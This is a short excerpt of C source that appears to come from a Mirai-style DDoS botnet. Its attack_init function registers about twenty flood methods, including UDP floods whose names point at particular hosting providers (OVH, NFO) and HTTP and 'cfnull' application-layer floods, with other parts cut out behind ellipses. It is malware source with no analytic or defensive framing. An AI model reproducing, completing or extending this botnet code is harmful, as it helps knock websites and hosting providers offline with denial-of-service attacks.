...
BOOL attack_init(void)
{
	...
	add_attack(ATK_VEC_OVH2, (ATTACK_FUNC)attack_udp_ovh2);
	add_attack(ATK_VEC_XMAS, (ATTACK_FUNC)attack_udp_xmas);
	add_attack(ATK_VEC_UDPHEX, (ATTACK_FUNC)attack_udp_udphex);
	add_attack(ATK_VEC_PSH, (ATTACK_FUNC)attack_udp_psh);
	add_attack(ATK_VEC_STDHEX, (ATTACK_FUNC)attack_udp_stdhex);
	add_attack(ATK_VEC_LYNX, (ATTACK_FUNC)attack_udp_lynx);
	add_attack(ATK_VEC_YSYNACK, (ATTACK_FUNC)attack_udp_ysynack);
	add_attack(ATK_VEC_NFO, (ATTACK_FUNC)attack_udp_nfo);
	add_attack(ATK_VEC_OVHHEX, (ATTACK_FUNC)attack_udp_ovhhex);
	add_attack(ATK_VEC_HEX, (ATTACK_FUNC)attack_udp_hex);
	add_attack(ATK_VEC_STD, (ATTACK_FUNC)attack_udp_std);
	add_attack(ATK_VEC_STD2, (ATTACK_FUNC)attack_udp_std2);
	add_attack(ATK_VEC_XMAS2, (ATTACK_FUNC)attack_udp_xmas2);
	add_attack(ATK_VEC_TCPUDP, (ATTACK_FUNC)attack_udp_tcpudp);
	add_attack(ATK_VEC_UDPPUSH, (ATTACK_FUNC)attack_udp_push);
	add_attack(ATK_VEC_UDPSTR, (ATTACK_FUNC)attack_udp_str);
	add_attack(ATK_VEC_HEX2, (ATTACK_FUNC)attack_udp_hex2);
	...
	add_attack(ATK_VEC_CFNULL, (ATTACK_FUNC)attack_app_cfnull);
    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
	add_attack(ATK_VEC_HTTPNULL, (ATTACK_FUNC)attack_app_httpnull);
